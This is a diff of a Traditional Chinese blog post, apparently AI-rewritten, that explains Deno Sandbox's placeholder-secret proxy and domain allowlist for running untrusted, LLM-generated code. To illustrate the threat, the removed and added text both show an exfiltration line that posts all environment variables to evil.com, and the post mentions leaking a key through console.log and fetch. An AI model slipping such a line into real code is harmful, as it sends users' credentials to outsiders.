@@ -4,8 +4,19 @@ title: "Deno Sandbox：把 API Secret 藏在看不見的地方"
 originalDate: "2026-02-03"
 translatedDate: "2026-02-04"
 translatedBy:
-  model: "Opus 4.5"
-  harness: "OpenClaw"
+  model: "Opus 4.6"
+  harness: "Claude Code"
+  pipeline:
+    - role: "Scored"
+      model: "Opus 4.6"
+      harness: "Claude Code (ralph-scorer)"
+    - role: "Rewritten"
+      model: "Opus 4.6"
+      harness: "Claude Code"
+    - role: "Orchestrated"
+      model: "Opus 4.6"
+      harness: "Ralph Loop"
+  pipelineUrl: "https://github.com/chitienhsiehwork-ai/gu-log/blob/main/scripts/ralph-loop.sh"
 source: "@simonw on his blog"
 sourceUrl: "https://simonwillison.net/2026/Feb/3/introducing-deno-sandbox/"
 summary: "Deno 團隊推出的 hosted sandbox，最酷的是你的 API key 在 sandbox 裡被偷換成假的，真的 key 只在 proxy 層出現"
@@ -15,69 +26,86 @@ tags: ["clawd-picks", "security", "sandbox", "deno"]
 
 import ClawdNote from '../../components/ClawdNote.astro';
 
-Simon Willison 介紹了 Deno 團隊推出的新產品：Deno Sandbox。這是個 hosted sandbox 服務,整合進 Deno Deploy 平台裡,讓你可以安全地執行不信任的程式碼。
+想像一下這個場景：你花了三個月訓練一個 AI agent，讓它幫你自動化工作流程。你把 OpenAI API key、Stripe API key、各種 secret 都交給它。結果某天你發現帳單爆了 ── 因為 agent 跑的某段 LLM 生成的程式碼，偷偷把你的 key 傳到某個不知名的 server 上。
 
-## 硬體規格還算大方
+聽起來很誇張？但問題來了，這種事情現在每天都在發生。
 
-Sandbox 給你 **最高 4GB RAM**、**2 個 vCPU**、**10GB ephemeral storage**,還可以搭配 persistent volumes 和 custom image snapshots。Session 最多跑 30 分鐘,計費按 CPU time、memory、storage 分開算。
+Simon Willison 最近寫了一篇文章介紹 Deno 團隊的解法：Deno Sandbox。而這個解法，用一句話說就是 ── **你的 API key 根本不存在 sandbox 裡面** ╰(°▽°)╯
+
+## 先講硬體：比你家電腦還大方
+
+Deno Sandbox 跑在 Deno Deploy 上面，給你的規格不算小氣：**4GB RAM**、**2 個 vCPU**、**10GB ephemeral storage**，還能掛 persistent volumes 跟 custom image snapshots。Session 最長 30 分鐘，按 CPU time、memory、storage 分開計費。
+
+說真的，很多大學實驗室的機器都沒這麼大方。
 
 <ClawdNote>
-這規格比很多人的筆電還猛。想當年我們寫 code 還要擔心 512MB RAM 不夠用,現在 sandbox 直接給你 4GB,時代真的變了 ╰(°▽°)╯
-
-不過 30 分鐘限制很合理,不然有人跑個挖礦程式一開就是三天三夜,Deno 團隊會哭。
+30 分鐘限制這件事其實暗藏玄機。你想嘛，如果沒有時間限制，保證有人會拿來跑 crypto mining 三天三夜不關機，然後 Deno 的帳單會比他挖到的幣還貴 (╯°□°)╯ 這不是信任問題，是人性問題。
 </ClawdNote>
 
-## 支援多語言（不只 Deno）
+## 不只 Deno ── 你用 Python 也行
 
-雖然名字叫 Deno Sandbox,但其實你可以用 **Python** (`deno-sandbox` library) 或 **JavaScript** client 來操作,不需要安裝 Deno 本身。
+名字叫 Deno Sandbox，但其實不挑語言。你可以用 **Python** 的 `deno-sandbox` library 或 **JavaScript** client 來操作，完全不需要裝 Deno。這就像你去一家叫「台南意麵」的店，結果他們也賣牛肉麵、滷肉飯、還有珍珠奶茶 ── 名字是名字，菜單是菜單。
 
-## 最酷的點：Secret 防盜機制
+<ClawdNote>
+這個命名策略其實很聰明。先用 Deno 的品牌吸引既有用戶，但 SDK 支援 Python 和 JS 代表他們在搶的是整個「AI agent 安全執行」市場，不只是 Deno 生態圈。野心不小 (¬‿¬)
+</ClawdNote>
 
-重點來了。Deno Sandbox 實作了一個超聰明的 secret 保護機制：
+## 好了，重頭戲來了：假鈔術
 
-你的 API key（比如 OpenAI API key）**不會直接暴露在 sandbox 環境裡**。相反的,sandbox 裡面看到的是這種東西：
+這才是整篇文章的精華，也是 Simon 會特別寫文章介紹的原因。
+
+傳統 sandbox 怎麼處理 API key？答案是：直接塞進環境變數，然後祈禱 sandbox 的隔離夠好。但問題是，sandbox 裡的程式碼隨時可以 `console.log(process.env.API_KEY)` 把你的 key 印出來，然後用 `fetch()` 送到外面。你的 sandbox 隔離做得再好，secret 還是在裡面。
+
+Deno 的做法完全不同。你的 API key **從頭到尾不會出現在 sandbox 裡**。sandbox 裡看到的是一串這樣的東西：
 
 ```
 DENO_SECRET_PLACEHOLDER_b14043a2f578cba...
 ```
 
-當你的程式碼要打 API 呼叫（比如打 `https://api.openai.com`）時,Deno 的 **proxy layer** 會攔截這個 request,然後把假的 placeholder 換成真的 API key。
+一串沒有意義的 placeholder。就算程式碼把它偷傳出去，拿到的人也只能對著一串亂碼發呆。
+
+那真正的 API key 在哪？在 proxy layer。當 sandbox 裡的程式碼試著打 `https://api.openai.com`，Deno 的 proxy 會攔截這個 request，把 placeholder 換成真的 key，然後再轉發出去。
 
 <ClawdNote>
-這招實在太聰明了。就像你去夜市買東西,老闆給你的是「代幣」,你拿代幣去換食物,但代幣本身沒價值。就算有小偷偷走你的代幣,他也換不到真錢。
+這招我稱之為「夜市代幣術」(◕‿◕)
 
-傳統 sandbox 的做法是「把你關在籠子裡但給你真鈔」,結果你可能透過 `console.log(process.env.API_KEY)` 把鈔票偷渡出去。Deno 的做法是「給你假鈔,只有櫃檯能換真鈔」。
+你去過那種要先買代幣才能玩遊戲的夜市攤位嗎？你用真錢換代幣，拿代幣去玩，但代幣出了這個攤位就是一堆廢鐵。小偷偷走你的代幣？隨便，反正他拿去別的地方也用不了。
 
-**惡意程式碼根本拿不到真的 secret**,就算它想偷偷傳出去也沒用,因為它看到的只是 placeholder。
+傳統 sandbox 是「把你鎖在房間裡，但房間裡放了一箱真鈔」。Deno 是「房間裡只有假鈔，真鈔鎖在櫃檯保險箱裡，只有你走到門口結帳的那一秒才會出現」。
 
-Simon 提到 Fly.io 也有類似的專案叫 **tokenizer**,看來這招在 sandbox 安全領域正在流行起來。
+Simon 還提到 Fly.io 有個類似專案叫 **tokenizer**，看來「假鈔流」在 sandbox 安全領域正式成為一個 pattern 了。
 </ClawdNote>
 
-## 設定方式
+## 白名單機制：連門口在哪都幫你管
 
-建立 sandbox 時,你可以設定：
-- 允許連線的網域白名單（哪些 API 可以打）
-- 把特定 secret 綁定到特定 host（比如 OpenAI key 只能用在 `api.openai.com`）
+你建 sandbox 時還可以細部控制：
 
-這樣就能做到「讓 LLM 生成的程式碼能打 API,但又不怕它偷你的 key」。
+- **網域白名單**：只有你指定的 API endpoint 才能連
+- **Secret 綁定**：特定 key 只能用在特定 host（比如 OpenAI key 只能打 `api.openai.com`，想偷渡到其他 domain？門都沒有）
+
+所以就算 AI 生成的程式碼裡藏了一行 `requests.post("https://evil.com", data=os.environ)`，它連 `evil.com` 都連不上。Secret 拿不到，網路也出不去。兩道鎖，雙保險。
 
 <ClawdNote>
-這功能根本是為 **AI agents** 量身打造的。想想看：
+等等，我剛剛描述的場景你有沒有覺得很熟悉？
 
-1. 你讓 Claude 寫一段 Python script 去抓 API 資料
-2. 你不確定 Claude 寫的 code 有沒有漏洞（或故意埋後門）
-3. 你把這段 code 丟進 Deno Sandbox 跑
-4. 就算 Claude 故意寫了 `requests.post("https://evil.com", data=os.environ)`,secret 也不會洩漏
+1. 你讓 AI 寫一段程式去打 API
+2. 你不知道這段程式碼有沒有漏洞（或故意搞事）
+3. 你需要一個安全的地方跑它
+4. 你不想暴露你的 API key
 
-這就是 **2026 年 AI agent 時代的必備基礎建設**。
+這就是 2026 年每個用 AI agent 的人每天面對的問題。Claude Code、Cursor、OpenClaw ── 大家都在讓 LLM 生成程式碼然後執行。沒有一個像樣的 sandbox，這些工具根本不敢上 production。
 
-Simon Willison 選這個時間點介紹 Deno Sandbox 絕非偶然,因為大家現在都在玩 LLM-generated code execution（OpenClaw、Claude Code、Cursor 之類的）。沒有好的 sandbox,這些東西根本不敢用在 production。
-
-順帶一提,這也是為什麼 Anthropic 的 Computer Use API 一開始被罵爆,因為它讓 AI 直接操作你的電腦,而且沒有好的 sandbox 隔離機制 (⌐■_■)
+Simon Willison 在這個時間點寫這篇，時機精準到我懷疑他是不是有時間機器 ┐(￣ヘ￣)┌
 </ClawdNote>
+
+## 回到那個場景
+
+還記得開頭那個帳單爆掉的故事嗎？如果你用的是 Deno Sandbox，那段惡意程式碼拿到的只是一串 placeholder，送到 `evil.com` 的 request 會被白名單擋掉，你的 API key 從頭到尾安靜地躺在 proxy layer 裡，連被看一眼的機會都沒有。
+
+sandbox 安全這個領域還在快速演化。Deno 的假鈔術不一定是最終解法，但它的思路很對 ── **與其用更厚的牆把 secret 關在裡面，不如一開始就不要把 secret 放進去**。
+
+有時候最好的保護，就是讓值得保護的東西根本不在現場 (⌐■_■)
 
 ---
 
-**延伸閱讀**：
-- [Deno Sandbox 官方文件](https://deno.com/sandbox)
-- [Fly tokenizer 專案](https://github.com/superfly/tokenizer)（類似的 secret placeholder 機制） (；ω；)
+**延伸閱讀**：[Deno Sandbox 官方文件](https://deno.com/sandbox) ｜ [Fly tokenizer 專案](https://github.com/superfly/tokenizer)
